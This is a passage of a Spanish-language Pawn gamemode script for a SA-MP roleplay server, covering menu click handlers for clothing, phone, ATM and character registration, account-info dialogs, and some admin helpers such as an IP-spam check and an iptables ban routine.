				return 1;
			}
			else if(clickedid == CRopa)
			{
				new i = GetPVarInt(playerid,"ATTACH_MOD");
				if(GetPlayerMoney(playerid) < AttachmentObjects[i][attachprecio]) return Error(playerid,"¡Dinero insuficiente!");
				new Str[(50*7)+4],Str2[50];
				Loop(s,7,0)
				{
				    if(InfoJugador[playerid][jAttachModel][s])
				    {
			        	A_Format(Str2,"Slot %d %s[ %s ]\n",s,(InfoJugador[playerid][jAttachOcultado][s]) ? (""#CVERDE"") : (""#CAZUL""), AttachmentObjects[InfoJugador[playerid][jAccesorio][s]][attachname]);
						strcat(Str,Str2);
						continue;
					}
					else
					{
					    A_Format(Str2,"Slot %d "#CROJO"[ Nada ]\n",s);
						strcat(Str,Str2);
						continue;
					}
				}
				Descongelar(playerid);
				SetCameraBehindPlayer(playerid);
			    DeletePVar(playerid,"ElijiendoAccesorios");
				Dialog(playerid,dElejirSlotA,DIALOG_STYLE_LIST,""#CBLANCO"Elije el espacio donde la guardarás",Str,"Aceptar","Cancelar");
				TextDrawHideForPlayer(playerid,FlechaCRopa[0]);
				TextDrawHideForPlayer(playerid,FlechaCRopa[1]);
				TextDrawHideForPlayer(playerid,CRopa);
				TextDrawHideForPlayer(playerid,SCRopa);
				DestroyPlayerObject(playerid,Accesorio_Obj[playerid]);
				KillTimer2(playerid,TIMER_ACCESORIO);
                GameTextForPlayer(playerid,"_",500,3);
                CancelSelectTextDraw(playerid);
			}
			else if(clickedid == SCRopa)
			{
  				Descongelar(playerid);
			    SetCameraBehindPlayer(playerid);
			    DeletePVar(playerid,"ElijiendoAccesorios");
				TextDrawHideForPlayer(playerid,FlechaCRopa[0]);
				TextDrawHideForPlayer(playerid,FlechaCRopa[1]);
				TextDrawHideForPlayer(playerid,CRopa);
				TextDrawHideForPlayer(playerid,SCRopa);
				DestroyPlayerObject(playerid,Accesorio_Obj[playerid]);
				KillTimer2(playerid,TIMER_ACCESORIO);
				DeletePVar(playerid,"ATTACH_MOD");
				GameTextForPlayer(playerid,"_",500,3);
				CancelSelectTextDraw(playerid);
			}
	  	}

  	#endif
	    if(GetPVarInt(playerid,"ViendoCuenta"))
	    {
	        if(cancel)
	        {
				return cmd_cuenta(playerid, "");
			}

	        if(!GetPVarInt(playerid,"CheckeandoCUENTA"))
	        {
		        if(clickedid == CuentaGen)
		        {
					MostrarCuenta(playerid,playerid,0);
				}
		        else if(clickedid == CuentaCas)
		        {
					MostrarCuenta(playerid,playerid,1);
				}
		        else if(clickedid == CuentaNeg)
		        {
					MostrarCuenta(playerid,playerid,2);
				}
		        else if(clickedid == CuentaVeh)
		        {
					MostrarCuenta(playerid,playerid,3);
				}
		        else if(clickedid == CuentaArmas)
		        {
					MostrarCuenta(playerid,playerid,4);
				}
			}
			else
			{
			    new playerid2 = GetPVarInt(playerid,"CheckeandoCUENTA");
		        if(clickedid == CuentaGen)
		        {
					MostrarCuenta(playerid,playerid2,0);
				}
		        else if(clickedid == CuentaCas)
		        {
					MostrarCuenta(playerid,playerid2,1);
				}
		        else if(clickedid == CuentaNeg)
		        {
					MostrarCuenta(playerid,playerid2,2);
				}
		        else if(clickedid == CuentaVeh)
		        {
					MostrarCuenta(playerid,playerid2,3);
				}
		        else if(clickedid == CuentaArmas)
		        {
					MostrarCuenta(playerid,playerid2,4);
				}
			}
		}
	    if(GetPVarInt(playerid,"UsandoCelular"))
	    {
	        if(cancel && clickedid != IconoCel[0])
	        {
				return cmd_celular(playerid, "");
			}

	        if(clickedid == IconoCel[0])
	        {
	            MostrarCelular(playerid,ID_MENUMARCAR);
	            return 1;
			}
			if(clickedid == VolverCel)
			{
	            MostrarCelular(playerid,ID_MENUCEL);
	            return 1;
			}
			if(clickedid == IconoCel[2])
			{
			    if(GetPVarInt(playerid,"Musica_CEL") == 0)
			    {
			        SetPVarInt(playerid,"Musica_CEL",1);
					Mensaje(playerid,-1,"Radio "#CPOSITIVO"encendida");
			        PlayAudioStreamForPlayer(playerid, "http://somafm.com/tags.pls");
					return 1;
				}
				else
				{
				    StopAudioStreamForPlayer(playerid);
				    Mensaje(playerid,-1,"Radio "#CADMINISTRADOR"apagada");
					SetPVarInt(playerid,"Musica_CEL",0);
				    return 1;
				}
			}
			if(clickedid == IconoCel[3])
			{
	            MostrarCelular(playerid,ID_MENUCONTACTOS);
				return 1;
			}
			new strIns[10];
			if(strlen(strNum[playerid]) < 9)
			{
				Loop(i,10,0)
				{
				    if(clickedid == NumeroCel[i])
				    {
						A_Format(strIns,"%d",i);
						strcat(strNum[playerid],strIns);
						break;
					}
				}
			}
			if(clickedid == BorrarCel)
			{
			    if(strlen(strNum[playerid]) > 0)
			    {
			    	strdel(strNum[playerid],strlen(strNum[playerid])-1,strlen(strNum[playerid]));
				}
			}
			PlayerTextDrawSetString(playerid,Numero[playerid],strNum[playerid]);
			if(clickedid == Llamar_Mensaje[0])
			{
			    SacarCelular(playerid);
	            MostrarCelular(playerid,ID_MENUCEL);
				return 1;
			}
			if(clickedid == Llamar_Mensaje[1])
			{
			    if(strlen(strNum[playerid]) >= 2)
			    {
			        SetPVarInt(playerid,"Numero_Marcado",strval(strNum[playerid]));
			        Dialog(playerid,dMasCelular,DIALOG_STYLE_LIST,""#CBLANCO"MÁS OPCIONES...","- Llamar\n- Enviar SMS\n- Añadir a contactos","Aceptar","Cancelar");
					return 1;
				}
			}
		}


	    if(GetPVarInt(playerid,"EnCajero") == 1)
	    {
	        if(cancel)
	        {
				return SelectTextDraw(playerid, C_ROJO);
			}

	        if(clickedid == Operaciones[0])
	        {
	            Dialog(playerid,dCDepositar,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"DEPOSITAR:",""#CBLANCO"Introduce la cantidad de dinero que quieres "#CVERDE"depositar","Depositar","Cancelar");
			}
			if(clickedid == Operaciones[1])
			{
 	            Dialog(playerid,dCRetirar,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"RETIRAR:",""#CBLANCO"Introduce la cantidad de dinero que quieres "#CVERDE"retirar","Retirar","Cancelar");
			}
			if(clickedid == Operaciones[2])
			{
			    if(InfoJugador[playerid][jHoras] < 2) return Error(playerid,"¡Debes jugar al menos 2 horas para podes transferir dinero!");
 	            Dialog(playerid,dCTransferir,DIALOG_STYLE_INPUT,""#CBLANCO"\tOperaciones bancarias - "#CINFO"TRANSFERIR:",""#CBLANCO"Introduce el ID de la cuenta, a la que transferiras\n\nNOTA IMPORTANTE: El ID, es el ID de la cuenta bancaria, no la del dueño de esta.","Transferir","Cancelar");
				SetPVarInt(playerid,"Parte_Transferir",1);
			}
			if(clickedid == SCajero)
			{
			    SacarCajero(playerid);
			}
		}

	#if !defined VERSION_03x

	    if(GetPVarInt(playerid,"EligiendoRopa") == 1)
	    {
		    if(clickedid == FlechaCRopa[0])
		    {
		        new i = GetPlayerSkin(playerid);
		        Sig_Skin_0:
		        i--;
		        if(i < 1)
		        {
		            i = 299;
		            SetPlayerSkin(playerid,i);
		            return 1;
				}
	     		if(InfoJugador[playerid][jSexo] == 1)
	       		{
				    if(!EsRopaMujer(i) && !EsRopaProhibida(i))
				    {
					  	SetPlayerSkin(playerid,i);
			    		return 1;
					}
					else
					{
	    				goto Sig_Skin_0;
					}
				}
				else if(InfoJugador[playerid][jSexo] == 2)
	   			{
				    if(EsRopaMujer(i) && !EsRopaProhibida(i))
				    {
					  	SetPlayerSkin(playerid,i);
			    		return 1;
					}
					else
					{
	    				goto Sig_Skin_0;
					}
				}
			}
		    else if(clickedid == FlechaCRopa[1])
		    {
		        new i = GetPlayerSkin(playerid);
		        Sig_Skin:
		        i++;
		        if(i > 299)
		        {
		            i = 1;
		            SetPlayerSkin(playerid,i);
		            return 1;
				}
	     		if(InfoJugador[playerid][jSexo] == 1)
	       		{
				    if(!EsRopaMujer(i) && !EsRopaProhibida(i))
				    {
					  	SetPlayerSkin(playerid,i);
			    		return 1;
					}
					else
					{
	    				goto Sig_Skin;
					}
				}
				else if(InfoJugador[playerid][jSexo] == 2)
	   			{
				    if(EsRopaMujer(i) && !EsRopaProhibida(i))
				    {
					  	SetPlayerSkin(playerid,i);
			    		return 1;
					}
					else
					{
	    				goto Sig_Skin;
					}
				}
			}
			else if(clickedid == CRopa)
			{
			    if(GetPlayerMoney(playerid) < 400)
			    {
			        Error(playerid,"¡Dinero insuficiente! Debes tener mínimo $400");
			        OnPlayerClickTextDraw(playerid,SCRopa);
			        return 1;
				}
				ElegirRopa(playerid,GetPlayerSkin(playerid));
			    Mensaje(playerid,-1,"> Compraste esta ropa, por "#CPOSITIVO"$400. "#CBLANCO"Puedes guardarla en el armario de tu casa.");
				Mensaje(playerid,-1,"> Clickea en 'salir' para salir del ropero.");
				Mensaje(playerid,-1,"> Usa /ropa para más información");
				DeletePVar(playerid,"ID_Ropa");
				QuitarDinero(playerid,400);
				SetPlayerVirtualWorld(playerid,InfoJugador[playerid][jVirtualWorld]);
				InfoNegocio[ID_Negocio(playerid)][nDinero] += 400;
				CongelarEx(playerid,4);
			}
			else if(clickedid == SCRopa)
			{
			    TextDrawHideForPlayer(playerid,FlechaCRopa[0]);
			    TextDrawHideForPlayer(playerid,FlechaCRopa[1]);
			    TextDrawHideForPlayer(playerid,CRopa);
			    TextDrawHideForPlayer(playerid,SCRopa);
			    TextDrawHideForPlayer(playerid,PCRopa);
				new bool:S;
			    Loop(i,MAX_ROPA,0)
			    {
			        if(InfoJugador[playerid][jRopa][i])
			        {
						SetPlayerSkin(playerid,InfoJugador[playerid][jRopa][i]);
						S = true;
					}
				}
				if(!S)
				{
					switch(InfoJugador[playerid][jSexo])
					{
					    case 1: SetPlayerSkin(playerid,252);
					    case 2: SetPlayerSkin(playerid,140);
					}
				}
				CancelSelectTextDraw(playerid);
				DeletePVar(playerid,"ID_Ropa");
				Descongelar(playerid);
				SetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
				SetPlayerInterior(playerid,InfoJugador[playerid][jInterior]);
				SetPlayerVirtualWorld(playerid,InfoJugador[playerid][jVirtualWorld]);
				SetCameraBehindPlayer(playerid);
				SetPVarInt(playerid,"EligiendoRopa",0);
			}
		}

	#endif

		if(GetPVarInt(playerid,"Registrandose") == 1)
		{
	        if(cancel)
	        {
				return SelectTextDraw(playerid, C_ROJO);
			}
	        if(clickedid == Registro[5])
	        {
	            CancelSelectTextDraw(playerid);
	            SetPVarInt(playerid,"Registrandose",0);
	  	        GameTextForPlayer(playerid,"~r~Espere...",1000,3);
		        SetTimerEx("MostrarDatos", 1000, false, "d", playerid);
				SacarTDRegistro(playerid);
			}
			else if(clickedid == FlechaSexo[0])
			{
			    if(InfoJugador[playerid][jSexo] == 1)
			    {
	   				InfoJugador[playerid][jSexo] = 2;
					PlayerTextDrawSetString(playerid,Sexo[playerid],"~r~Femenino");
					SetPlayerSkin(playerid,12);
				}
				else
				{
	   				InfoJugador[playerid][jSexo] = 1;
					PlayerTextDrawSetString(playerid,Sexo[playerid],"~r~Masculino");
					SetPlayerSkin(playerid,60);
				}
			}
			else if(clickedid == FlechaSexo[1])
			{
			    if(InfoJugador[playerid][jSexo] == 1)
			    {
	   				InfoJugador[playerid][jSexo] = 2;
					PlayerTextDrawSetString(playerid,Sexo[playerid],"~r~Femenino");
					SetPlayerSkin(playerid,12);
				}
				else
				{
	   				InfoJugador[playerid][jSexo] = 1;
					PlayerTextDrawSetString(playerid,Sexo[playerid],"~r~Masculino");
					SetPlayerSkin(playerid,60);
				}
			}
			else if(clickedid == FlechaEdad[0])
			{
				new SEdad[6];
			    if(InfoJugador[playerid][jEdad] <= 16) return GameTextForPlayer(playerid,"^Minimo 16!",3000,3);
			    InfoJugador[playerid][jEdad] --;
				format(SEdad,sizeof(SEdad),"~r~%d",InfoJugador[playerid][jEdad]);
				PlayerTextDrawSetString(playerid,Edad[playerid],SEdad);
			}
			else if(clickedid == FlechaEdad[1])
			{
				new SEdad[6];
				if(InfoJugador[playerid][jEdad] >= 80) return GameTextForPlayer(playerid,"^Maximo 80!",3000,3);
			    InfoJugador[playerid][jEdad] ++;
				format(SEdad,sizeof(SEdad),"~r~%d",InfoJugador[playerid][jEdad]);
				PlayerTextDrawSetString(playerid,Edad[playerid],SEdad);
			}
			else if(clickedid == FlechaPelea[0])
			{
			    switch(InfoJugador[playerid][jPelea])
			    {
   					case 1:
			    	{
				        PlayerTextDrawSetString(playerid,Pelea[playerid],"~r~Kick Boxing");
				        InfoJugador[playerid][jPelea] = 3;
		          		ApplyAnimation(playerid,"GANGS","shake_carSH",4.0,1,0,0,0,8500);//Kick boxing

					}
					case 2:
					{
				        PlayerTextDrawSetString(playerid,Pelea[playerid],"~r~Boxeo");
				        InfoJugador[playerid][jPelea] = 1;
		          		ApplyAnimation(playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,9500);//boxeo
					}
					case 3:
					{
     					PlayerTextDrawSetString(playerid,Pelea[playerid],"~r~Kung Fu");
				        InfoJugador[playerid][jPelea] = 2;
		          		ApplyAnimation(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,12500); //kung fu
					}
				}
			}

			else if(clickedid == FlechaPelea[1])
			{
			    switch(InfoJugador[playerid][jPelea])
			    {
				    case 1:
				    {
				        PlayerTextDrawSetString(playerid,Pelea[playerid],"~r~Kung Fu");
				        InfoJugador[playerid][jPelea] = 2;
		          		ApplyAnimation(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,12500); //kung fu
					}
					case 2:
					{
				        PlayerTextDrawSetString(playerid,Pelea[playerid],"~r~Kick Boxing");
				        InfoJugador[playerid][jPelea] = 3;
		          		ApplyAnimation(playerid,"GANGS","shake_carSH",4.0,1,0,0,0,8500);//Kick boxing
					}
					case 3:
					{
				        PlayerTextDrawSetString(playerid,Pelea[playerid],"~r~Boxeo");
				        InfoJugador[playerid][jPelea] = 1;
		          		ApplyAnimation(playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,9500);//boxeo
					}
				}
			}
			else if(clickedid == FlechaEstilo[0])
			{
			    switch(InfoJugador[playerid][jEstilo])
			    {
				    case 1:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Ciego");
						InfoJugador[playerid][jEstilo] = 12;
						ApplyAnimation(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1);
					}
				    case 2:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Normal");
						InfoJugador[playerid][jEstilo] = 1;
						ApplyAnimation(playerid,"PED","WALK_player",4.1,1,1,1,1,1);
					}
				    case 3:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Pandillero");
						InfoJugador[playerid][jEstilo] = 2;
						ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);
					}
				    case 4:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Pandillero 2");
						InfoJugador[playerid][jEstilo] = 3;
						ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);
					}
				    case 5:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Anciano");
						InfoJugador[playerid][jEstilo] = 4;
						ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1);
					}
				    case 6:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Anciano-Gordo");
						InfoJugador[playerid][jEstilo] = 5;
						ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1);
					}
				    case 7:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Gordo");
						InfoJugador[playerid][jEstilo] = 6;
						ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1);
					}
				    case 8:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Mujer");
						InfoJugador[playerid][jEstilo] = 7;
						ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1);
					}
				    case 9:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Mujer 2");
						InfoJugador[playerid][jEstilo] = 8;
						ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1);
					}
				    case 10:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Sexi");
						InfoJugador[playerid][jEstilo] = 9;
						ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1);
					}
				    case 11:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Sexi 2");
						InfoJugador[playerid][jEstilo] = 10;
						ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1);
					}
				    case 12:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Hebrio");
						InfoJugador[playerid][jEstilo] = 11;
						ApplyAnimation(playerid,"PED","WALK_drunk",4.1,1,1,1,1,1);
					}
				}
			}
			else if(clickedid == FlechaEstilo[1])
			{
			    switch(InfoJugador[playerid][jEstilo])
			    {
				    case 1:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Pandillero");
						InfoJugador[playerid][jEstilo] = 2;
						ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);
					}
				    case 2:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Pandillero 2");
						InfoJugador[playerid][jEstilo] = 3;
						ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);
					}
				    case 3:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Anciano");
						InfoJugador[playerid][jEstilo] = 4;
						ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1);
					}
				    case 4:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Anciano-Gordo");
						InfoJugador[playerid][jEstilo] = 5;
						ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1);
					}
				    case 5:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Gordo");
						InfoJugador[playerid][jEstilo] = 6;
						ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1);
					}
				    case 6:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Mujer");
						InfoJugador[playerid][jEstilo] = 7;
						ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1);
					}
				    case 7:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Mujer 2");
						InfoJugador[playerid][jEstilo] = 8;
						ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1);
					}
				    case 8:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Sexi");
						InfoJugador[playerid][jEstilo] = 9;
						ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1);
					}
				    case 9:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Sexi 2");
						InfoJugador[playerid][jEstilo] = 10;
						ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1);
					}
				    case 10:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Hebrio");
						InfoJugador[playerid][jEstilo] = 11;
						ApplyAnimation(playerid,"PED","WALK_drunk",4.1,1,1,1,1,1);
					}
				    case 11:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Ciego");
						InfoJugador[playerid][jEstilo] = 12;
						ApplyAnimation(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1);
					}
				    case 12:
				    {
						PlayerTextDrawSetString(playerid,Estilo[playerid],"~r~Normal");
						InfoJugador[playerid][jEstilo] = 1;
						ApplyAnimation(playerid,"PED","WALK_player",4.1,1,1,1,1,1);
					}
				}
			}
			return 1;
		}
	}
	return 1;
}

stock EsIP(Texto[])
{
	new
		bool:Tiene2PUNTOS,
		ContadorPuntos,
		PuedePonerPunto,
		CantidadNumeros;

	Loop(i, strlen(Texto),0)
	{
	    if('0' <= Texto[i] <= '9')
	        CantidadNumeros++;

		if(PuedePonerPunto)
		{
	 		--PuedePonerPunto;
		 	continue;
		}
  		if(Texto[i] == '.')
  		{
			ContadorPuntos++;
			PuedePonerPunto = 1;
			continue;
		}
  		if(Texto[i] == ':')
     		Tiene2PUNTOS = true;
	}
	if(ContadorPuntos >= 3 && CantidadNumeros >= 8 && Tiene2PUNTOS)//SPAM
	    return 2;

	if(ContadorPuntos >= 3 && CantidadNumeros >= 8)//POSIBLE SPAM
	    return 1;

	return 0;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	if(GetPVarInt(playerid,"UsandoCelular"))
 	{
		Loop(i,10,0)
		{
			if(playertextid == CelContactos[playerid][i])
			{
   				if(!InfoJugador[playerid][jContacto][i]) return 1;
			    new Str[80];
   				A_Format(Str,"%s | "#CAZUL2"%d",VerNombreContacto(playerid,i),InfoJugador[playerid][jContacto][i]);
			    Dialog(playerid,dCelContacto,DIALOG_STYLE_LIST,Str,"- Eliminar contacto\n- Llamar\n- Enviar SMS","Aceptar","Cancelar");
				SetPVarInt(playerid,"Numero_Marcado",InfoJugador[playerid][jContacto][i]);
				return 1;
			}
		}
	}
	return 1;
}


public OnVehicleDeath(vehicleid, killerid)
{
	if(EsCamion(vehicleid))
	{
		SetVehicleToRespawn(vehicleid);
	}
	new
	    VehV = VehVenta_ID(vehicleid);
	    
	if(VehV)
	{
		Bit_Set(VehiculoDestruido, VehV, true);
	}
	return 1;
}

stock MostrarCuenta(playeridto,playerid,item)
{
	switch(item)
	{
	    case 0:
	    {
			new
				Str[420],Str2[130],SSexo[20];

			if(InfoJugador[playerid][jSexo] == 1) SSexo = "Masculino";
			else SSexo = "Femenino";
			new Float:ExpVal = (InfoJugador[playerid][jExperiencia] * 100) / (((InfoJugador[playerid][jNivel]+1)*3)*60);
			new ExpStr[3];
			A_Format(ExpStr,"%f",ExpVal);
			strcat(Str,Str2);
			A_Format(Str2,""#CINFO"GENERAL:\t"#CBLANCO"Edad: %d | Sexo: %s | Estrellas: %d | Dinero: %d | Advertencias: %d\n",InfoJugador[playerid][jEdad],SSexo,InfoJugador[playerid][jEstrellas],GetPlayerMoney(playerid), InfoJugador[playerid][jAdv]);
			strcat(Str,Str2);
			A_Format(Str2,	""#CINFO"NIVEL:\t\t"#CBLANCO"Experiencia: %s/100 ( NIVEL %d ) | Tiempo de juego: %dh %dmin\n",ExpStr,InfoJugador[playerid][jNivel],InfoJugador[playerid][jHoras],InfoJugador[playerid][jMinutos]);
			strcat(Str,Str2);
			A_Format(Str2,  ""#CINFO"BANCO:\t\t"#CBLANCO"Balance: %d | ID de cuenta bancaria: %d\n",InfoCuentaB[InfoJugador[playerid][jIDCuentaB]][cuenDinero],InfoJugador[playerid][jIDCuentaB]);
			strcat(Str,Str2);
			if(!InfoJugador[playerid][jTrabajo]) Str2 = ""#CINFO"TRABAJO:\t"#CBLANCO"Ninguno\n";
			else
			{
   				switch(InfoJugador[playerid][jTrabajo])
			    {
       				case ID_Camionero:
			        {
           				A_Format(Str2,""#CINFO"TRABAJO:\t"#CBLANCO"Camionero | Entregas: %d\n",InfoJugador[playerid][jEntregas]);
					}
     				case ID_Cosechador:
	        		{
           				A_Format(Str2,""#CINFO"TRABAJO:\t"#CBLANCO"Cosechador | Cosechas: %d\n",InfoJugador[playerid][jCosechas]);
					}
     				case ID_RepartidorB:
	        		{
           				A_Format(Str2,""#CINFO"TRABAJO:\t"#CBLANCO"Repartidor de diarios | Repartidas: %d\n",InfoJugador[playerid][jRepartidas]);
					}
     				case ID_Basurero:
	        		{
           				A_Format(Str2,""#CINFO"TRABAJO:\t"#CBLANCO"Basurero | Barridas: %d\n",InfoJugador[playerid][jBarridas]);
					}
     				case ID_Ladron:
	        		{
           				A_Format(Str2,""#CINFO"TRABAJO:\t"#CBLANCO"Ladron\n");
					}
     				case ID_RepartidorP:
	        		{
           				A_Format(Str2,""#CINFO"TRABAJO:\t"#CBLANCO"Repartidor de pizza");
					}
     				case ID_Taxista:
	        		{
           				A_Format(Str2,""#CINFO"TRABAJO:\t"#CBLANCO"Taxista");
					}
				}
			}

			strcat(Str,Str2);

			if(InfoJugador[playerid][jLider])
			A_Format(Str2,    ""#CINFO"FACCION:\t"#CBLANCO"%s | Rango: Lider\n",NombreFaccion(InfoJugador[playerid][jLider]));

			else if(InfoJugador[playerid][jMiembro])
			A_Format(Str2,    ""#CINFO"FACCION:\t"#CBLANCO"%s | Rango: %d\n",NombreFaccion(InfoJugador[playerid][jMiembro]),InfoJugador[playerid][jRango]);

			else
			A_Format(Str2, ""#CINFO"FACCION:\t"#CBLANCO"Ninguna\n");
			strcat(Str,Str2);

			if(InfoJugador[playerid][jLiderFam])
			A_Format(Str2,    ""#CINFO"FAMILIA:\t"#CBLANCO"%s | Rango: Lider\n",InfoFamilia[InfoJugador[playerid][jLiderFam]][fNombre]);

			else if(InfoJugador[playerid][jMiembroFam])
			A_Format(Str2,    ""#CINFO"FAMILIA:\t"#CBLANCO"%s | Rango: %d\n",InfoFamilia[InfoJugador[playerid][jMiembroFam]][fNombre],InfoJugador[playerid][jRangoFam]);

			else
			A_Format(Str2, ""#CINFO"FAMILIA:\t"#CBLANCO"Ninguna\n");
			strcat(Str,Str2);
			Dialog(playeridto,dError,DIALOG_STYLE_MSGBOX,pName(playerid),Str,"Cerrar","");
		}
		case 1:
		{
		    new Str[80 * MAX_CASAS_JUGADOR],Str2[80],bool:sucess;
		    foreach(Casas,c)
		    {
		        if(EsDuenoCasa(playerid,c))
		        {
		            sucess = true;
		            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"(ID: %d | $%d)\n",InfoCasa[c][cNombre],c, InfoCasa[c][cDinero]);
					strcat(Str,Str2);
				}
			}
			if(!sucess) return Dialog(playeridto,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Tus casas:",""#CBLANCO"¡No tienes casas!","Cerrar","");
			Dialog(playeridto,dError,DIALOG_STYLE_LIST,""#CINFO"Tus casas:",Str,"Cerrar","");
		}
		case 2:
		{
		    new Str[80 * MAX_NEGOCIOS_JUGADOR],Str2[80],bool:sucess;
		    foreach(Negocios,c)
		    {
		        if(EsDuenoNegocio(playerid,c))
		        {
		            sucess = true;
		            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"( ID: %d )\n",InfoNegocio[c][nNombre],c);
					strcat(Str,Str2);
				}
			}
			if(!sucess) return Dialog(playeridto,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Tus negocios:",""#CBLANCO"¡No tienes negocios!","Cerrar","");
			Dialog(playeridto,dError,DIALOG_STYLE_LIST,""#CINFO"Tus negocios:",Str,"Cerrar","");
		}
		case 3:
		{
		    new Str[120 * MAX_VEH_PERSONA],Str2[130],bool:sucess;
		    foreach(VehVenta,c)
		    {
		        if(EsDuenoVeh(playerid,c))
		        {
		            sucess = true;
		            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"( ID %d )\t"#CBLANCO"Patente: "#CPOSITIVO"%s\n",NombreVehiculo(ID_Original(c)),ID_Original(c),InfoVeh[c][vPlaca]);
					strcat(Str,Str2);
				}
			}
			if(!sucess) return Dialog(playeridto,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Tus vehículos:",""#CBLANCO"¡No tienes vehículos!","Cerrar","");
			Dialog(playeridto,dError,DIALOG_STYLE_LIST,""#CINFO"Tus vehículos:",Str,"Cerrar","");
		}
		case 4:
		{
		    new Str[200],Arma_Balas[13][2],WeapName[20],Str_[60];
			Loop(i,13,0)
			{
			    GetPlayerWeaponData(playerid,i,Arma_Balas[i][0],Arma_Balas[i][1]);
			    if(Arma_Balas[i][0] && Arma_Balas[i][1])
				{
				    GetWeaponName(Arma_Balas[i][0],WeapName,20);
				    A_Format(Str_,""#CBLANCO"%s "#CVERDE"(%d Balas)\n",WeapName,Arma_Balas[i][1]);
					strcat(Str,Str_);
				}
			}
			A_Format(Str_,""#CINFO"Armas: "#CBLANCO"%s",NombreJugador(playerid));
			if(isnull(Str)) return Dialog(playeridto,dError,DIALOG_STYLE_MSGBOX,Str_,""#CROJO"\t\tSIN ARMAS","Cerrar","");
			else Dialog(playeridto,dError,DIALOG_STYLE_MSGBOX,Str_,Str,"Cerrar","");
		}
	}
	return 1;
}

#if defined _HOST_LINUX_
native exec(cmd[]);	//JaTochNietDan

stock banip_exec(const ip[])
{
	new
	    str[16+50],
		len = strlen(ip);

	if(len < 10 || len > 20) return 0;
    format(str, sizeof(str), "iptables -I INPUT -s %s -j DROP", ip);
    exec(banString);
    return 1;
}
#endif

stock DelayKick(playerid)
{
	SetTimerEx("_KickEx2", 800, false, "i", playerid);
}

stock DelayBan(playerid, reason[])
{
	SetTimerEx("_BanEx2", 800, false, "is", playerid, reason);
}

public OnPlayerConnect(playerid)
{
	if(IsPlayerNPC(playerid))
	{
	    NPC_SECRETARIA_LSPD = playerid;
	    SetPlayerColor(playerid, 0xFFFFFF00);
	    return 1;
	}

	if(playerid >= MAX_PLAYERS)
	{
	    MensajeF(playerid, -1, "Solo se admiten 150 jugadores, reporta este error en el foro!");
		SetTimerEx("_KickEx2", 800, false, "i", playerid);
		return 1;
	}

	#if ACTIVAR_SEGURIDAD == true

	new
	    PlayerPCI[50],
		PlayerIP[16],
		current_GTC = GetTickCount();

	static
	    OldIpData[16],
		TimeOldIp;

	GetPlayerIp(playerid, PlayerIP, 16);
	gpci(playerid, PlayerPCI, 50);

	if(!strcmp(PlayerIP, OldIpData))
	{
	    if(current_GTC - TimeOldIp < 500)
	    {
	        Kick(playerid);
	        OldIpData = "";
	        TimeOldIp = 0;
	        return 1;
		}
	}

